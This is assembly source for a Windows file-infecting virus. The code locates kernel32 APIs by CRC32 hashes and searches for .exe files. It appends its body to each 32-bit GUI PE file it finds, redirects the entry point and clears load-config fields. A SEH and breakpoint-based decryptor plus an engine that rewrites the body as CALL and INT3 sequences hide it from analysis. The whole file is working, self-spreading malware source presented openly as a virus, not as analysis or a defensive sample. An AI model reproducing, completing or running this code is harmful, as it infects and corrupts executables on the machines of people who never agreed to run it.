.386
.model  flat, stdcall
include posey.inc
.code
assume  fs:nothing

;//-------------------------------------------------------------------------------
;//appender virus body. very simple
;//-------------------------------------------------------------------------------

vbody_code      label    near
        mov     esp, esi                     ;//stack-pointer to original
        pop     fs:[eax]                     ;//uninstall SEH decryptor
        pop     eax
                                             ;//after 'MZ' the RVA
        add     ebx, dword ptr [ebx + IMAGE_DOS_HEADER.e_cblp]
        push    ebx
        xor     edx, edx
        call    find_krn
        pop     eax
        pop     eax
        pop     esp
        xor     eax, eax
        pop     fs:[eax]
        pop     eax
        ret

find_krn        label    near
        xor     edx, edx
        push    fs:[edx]
        mov     fs:[edx], esp
        mov     eax, dword ptr [ebp + PEB_LDR_DATA]
        mov     esi, dword ptr [eax + 0 + InLoadOrderModuleList]
        lods    dword ptr [esi]
        xchg    esi, eax
        lods    dword ptr [esi]
        call    push_crctbl

;//-------------------------------------------------------------------------------
;//API CRC list
;//-------------------------------------------------------------------------------

        dd      0efc7ea74h
        dd      02519b15ah
        dd      0391ab6afh
        dd      0553b5c78h
        dd      0b41b926ch
        dd      0c9ebd5ceh
        dd      075272948h
        dd      0a89b382fh
        dd      0b09315f4h
        db      2ah                          ;//1 byte terminator
                                             ;//no CRC listed can begin with 2A
        db      2eh, 65h, 78h, 65h, 0        ;//executable file
        
push_crctbl     label    near
        pop     esi
        mov     ebp, dword ptr [eax + 18h]

;//-------------------------------------------------------------------------------
;//walk lists
;//-------------------------------------------------------------------------------

walk_dll        label    near
        mov     eax, dword ptr [ebp + IMAGE_DOS_HEADER.e_lfanew]
        mov     ebx, dword ptr [ebp + eax + IMAGE_DOS_HEADER.e_lfanew shl 1]
        add     ebx, ebp

walk_names      label    near
        mov     edi, dword ptr [ebx + IMAGE_EXPORT_DIRECTORY.AddressOfNames]
        add     edi, ebp
        mov     edi, dword ptr [edi + edx * 4]
        add     edi, ebp
        or      eax, -1

crc32_l1        label    near
        xor     al, byte ptr [edi]
        push    8  
        pop     ecx

crc32_l2        label    near
        shr     eax, 1
        jnc     crc32_l3
        xor     eax, 0edb88320h

crc32_l3        label    near
        loop    crc32_l2
        inc     edi
        cmp     byte ptr [edi], cl
        jne     crc32_l1
        not     eax
        cmp     dword ptr [esi], eax
        je      l_res
        inc     edx
        cmp     dword ptr [ebx + IMAGE_EXPORT_DIRECTORY.NumberOfNames], edx
        jne     walk_names
        int     3

;//-------------------------------------------------------------------------------
;//resolve API address
;//----
;//find exe files
;//-------------------------------------------------------------------------------

l_res           label    near
        mov     edi, dword ptr [ebx + IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals]
        add     edi, ebp
        movzx   edi, word ptr [edi + edx * 2]
        mov     eax, dword ptr [ebx + IMAGE_EXPORT_DIRECTORY.AddressOfFunctions]
        add     eax, ebp
        mov     eax, dword ptr [eax + edi * 4]
        add     eax, ebp
        push    eax
        xor     edx, edx
        lods    dword ptr [esi]
        cmp     byte ptr [esi], "*"
        jne     walk_dll
        xchg    esi, eax
        mov     esi, esp
        enter   sizeof WIN32_FIND_DATA + sizeof IMAGE_DOS_HEADER.e_magic, 0
        mov     edi, esp
        push    esp
        push    eax
        call    esFindFirstFileA
        xchg    ebp, eax
        xor     ebx, ebx

;//-------------------------------------------------------------------------------
;//map view
;//-------------------------------------------------------------------------------

create_map      label    near
        pushad
        push    ebx
        push    ebx
        push    3  
        push    ebx
        push    ebx
        push    3                            ;//GENERIC_READ or GENERIC_WRITE
        lea     edx, dword ptr [edi + WIN32_FIND_DATA.cFileName]
        push    edx
        call    esCreateFileA
        push    eax
        push    eax
        push    ebx
        push    ebx
        mov     ebp, dword ptr [edi + WIN32_FIND_DATA.nFileSizeLow]
        push    ebp
        push    eax
        push    ebx
        add     ebp, 1012h
        push    ebp
        push    ebx
        push    4                            ;//PAGE_READWRITE
        push    ebx
        push    eax
        call    esCreateFileMappingA
        push    eax
        push    ebp
        push    ebx
        push    ebx
        push    2                            ;//FILE_MAP_WRITE
        push    eax
        call    esMapViewOfFile
        push    eax
        pushad
        call    infect_pe32

delta_unmap     label    near
        pop     eax
        pop     eax
        pop     esp
        xor     eax, eax
        pop     dword ptr fs:[eax]
        pop     eax
        popad
        call    esUnmapViewOfFile
        call    dword ptr [esi + (offset infect_pe32 - offset call_outseh) - 1]
        call    esSetFilePointer
        call    esSetEndOfFile
        call    dword ptr [esi + (offset infect_pe32 - offset call_outseh) - 1]
        popad
        push    edi
        push    ebp
        call    esFindNextFileA
        test    eax, eax
        jnz     create_map

call_outseh     label    near
        int     3                            ;//solar ghosts come kiss the moon goodnight

infect_pe32     label    near

;//-------------------------------------------------------------------------------
;//MZ and PE signatures
;//32-bit machine. GUI mode
;//no appended data (infection sign, attribute certificates, debug info, etc)
;//-------------------------------------------------------------------------------

        push    dword ptr fs:[ebx]
        mov     dword ptr fs:[ebx], esp
        cmp     word ptr [eax], "ZM"
        jne     call_outseh
        mov     ebp, eax
        add     eax, dword ptr [eax + IMAGE_DOS_HEADER.e_lfanew]
        cmp     dword ptr [eax], "EP"
        jne     call_outseh
        cmp     word ptr [eax + IMAGE_NT_HEADERS.FileHeader.Machine], IMAGE_FILE_MACHINE_I386
        jne     call_outseh
        cmp     word ptr [eax + IMAGE_NT_HEADERS.OptionalHeader.Subsystem], IMAGE_SUBSYSTEM_WINDOWS_GUI
        jne     call_outseh
        movzx   edx, word ptr [eax + IMAGE_NT_HEADERS.FileHeader.SizeOfOptionalHeader]
        movzx   ecx, word ptr [eax + IMAGE_NT_HEADERS.FileHeader.NumberOfSections]
        imul    ecx, ecx, sizeof IMAGE_SECTION_HEADER
        lea     esi, dword ptr [eax + edx + IMAGE_NT_HEADERS.OptionalHeader - sizeof IMAGE_SECTION_HEADER]
        add     esi, ecx
        mov     ecx, dword ptr [esi + IMAGE_SECTION_HEADER.PointerToRawData]
        mov     edx, dword ptr [esi + IMAGE_SECTION_HEADER.SizeOfRawData]
        add     ecx, edx
        cmp     dword ptr [edi + WIN32_FIND_DATA.nFileSizeLow], ecx
        jne     call_outseh
        mov     bh, 10h
        stc
        adc     dword ptr [esp + REG_ESP * REG_EDI + 18h], ebx
        lea     edi, dword ptr [ebp + ecx]
        mov     ecx, dword ptr [esi + IMAGE_SECTION_HEADER.Misc.VirtualSize]
        add     dword ptr [esi + IMAGE_SECTION_HEADER.Misc.VirtualSize], ebx
        add     dword ptr [esi + IMAGE_SECTION_HEADER.SizeOfRawData], ebx
        add     dword ptr [eax + IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage], ebx
        add     edx, dword ptr [esi + IMAGE_SECTION_HEADER.VirtualAddress]
        bts     dword ptr [esi + IMAGE_SECTION_HEADER.Characteristics], 1fh
        mov     ecx, dword ptr [esp + 4]
        lea     esi, dword ptr [ecx - ((offset delta_unmap - offset vbody_code) + (offset cinte_cend - offset cinte_code) + (offset vbody_end - offset vbody_code) * 5 + 5 + 100h)]
        push    edx
        xchg    dword ptr [eax + IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint], edx
        mov     dword ptr [ebp + IMAGE_DOS_HEADER.e_cblp], edx
        mov     ecx, (offset cinte_cend - offset cinte_code) + (offset vbody_end - offset vbody_code) * 5 + 5 + 100h
        pop     edx
        mov     bh, 1
        add     edx, ecx
        mov     dword ptr [esi + (offset ccode_off - offset cinte_code) + 2], edx
        sub     edx, ebx
        mov     dword ptr [esi + (offset inttbl_off - offset cinte_code) + 2], edx
        rep     movs byte ptr [edi], byte ptr [esi]
        mov     word ptr [eax + IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics], cx
        mov     cl, IMAGE_OHDD32_LOAD_CONFIG_TABLE
        fldz
        fstp    qword ptr [eax + ecx]
        int     3
vbody_end       label    near

;//-------------------------------------------------------------------------------
;//only SEH is part of the virus, all bellow is the engine.
;//-------------------------------------------------------------------------------

message         proc
        xor     ebx, ebx
        push    "*C"                         ;//faces count minutes till noon
        push    esp 
        pop     ecx
        push    ebx
        push    ebx
        push    ebx
        push    ecx
        push    ebx
        call    MessageBox 
        call    ExitProcess
message         endp

code_exe        proc     near
        push    esp
        push    4                            ;//PAGE_READWRITE
        push    6
        mov     edi, 400000h
        push    edi
        call    VirtualProtect 
        mov     dword ptr [edi + sizeof IMAGE_DOS_HEADER.e_magic], offset message - 400000h
        pushad
        xor     eax, eax
        mov     edi, offset gap_code
        mov     ebx, offset gap_code - 400000h
        call    copy_seh
        
;//-------------------------------------------------------------------------------
;//SEH decryptor
;//-------------------------------------------------------------------------------

cinte_code      proc     near
        mov     ebp, ebx
        mov     ebx, dword ptr [ebx + PROCESS_ENVIRONMENT_BLOCK_IMAGE_BASE]
        xor     eax, eax
        call    skip_ciseh
        
decryptor       proc     near
        pop     ecx
        pop     edx
        pop     eax
        pop     eax
        push    ecx
        add     eax, 7fh
        mov     ecx, dword ptr [eax + CONTEXT.regEbx - (INTERRUPT_TBLSIZE - 80h)]
        cmp     dword ptr [edx + EXCEPTION_RECORD.ExceptionCode], EXCEPTION_BREAKPOINT
        jne     reset_eip
        mov     edx, dword ptr [edx + EXCEPTION_RECORD.ExceptionAddress]
        sub     edx, ecx

inttbl_off      label    near
        sub     edx, "silk"                  ;//RVA of interruptions table
        mov     ecx, dword ptr [eax + CONTEXT.regEdi - 7fh]
        mov     byte ptr [ecx], dl 
        inc     dword ptr [eax + CONTEXT.regEdi - 7fh]
        mov     ecx, dword ptr [eax + CONTEXT.regEsp - 7fh]
        mov     ecx, dword ptr [ecx]
        mov     dword ptr [eax + CONTEXT.regEip - 7fh], ecx
        jmp     return

reset_eip       label    near
        add     ecx, dword ptr [ecx + IMAGE_DOS_HEADER.e_cblp]
        mov     dword ptr [eax + CONTEXT.regEip - (INTERRUPT_TBLSIZE - 80h)], ecx

return          label    near
        xor     eax, eax
        ret
decryptor       endp

skip_ciseh      label    near
        push    dword ptr fs:[eax]
        mov     dword ptr fs:[eax], esp

ccode_off       label    near                ;//RVA of code space
        lea     edi, dword ptr [ebx + "silk"]
        mov     esi, esp                     ;//the stack gets filled by return addresses
cinte_cend      label    near
cinte_code      endp

;//-------------------------------------------------------------------------------
;//obfuscate the code: generate CALLs and INT3s
;//-------------------------------------------------------------------------------

copy_seh        label    near
        pop     esi
        push    offset cinte_cend - offset cinte_code
        pop     ecx
        rep     movs byte ptr [edi], byte ptr [esi]
        lea     eax, dword ptr [ebx + (offset cinte_cend - offset cinte_code) + (offset vbody_end - offset vbody_code) * 5 + 5]
        mov     dword ptr [edi - (offset copy_seh - offset inttbl_off) + 2], eax
        inc     ch
        add     eax, ecx
        mov     dword ptr [edi - (offset copy_seh - offset ccode_off) + 2], eax
        push    ecx
        sub     esi, offset cinte_cend - offset vbody_code
        lea     ebp, dword ptr [edi + (offset vbody_end - offset vbody_code) * 5 + 5]
        mov     ecx, offset vbody_end - offset vbody_code

code_opnext     label    near
        xor     eax, eax
        mov     al, 0e8h
        stos    byte ptr [edi]
        lods    byte ptr [esi]
        push    ebp
        sub     ebp, edi
        lea     eax, dword ptr [ebp + eax - 4]
        pop     ebp
        stos    dword ptr [edi]
        loop    code_opnext
        mov     al, 0e9h
        stos    byte ptr [edi]
        pop     eax
        stos    dword ptr [edi]
        xchg    eax, ecx
        mov     al, 0cch
        rep     stos byte ptr [edi]
        popad

gap_code        label    near                ;//code starts running here
        db      (offset cinte_cend - offset cinte_code) + (offset vbody_end - offset vbody_code) * 5 + 5 + 100h + (offset vbody_end - offset vbody_code) dup ("*")
code_exe        endp
end     code_exe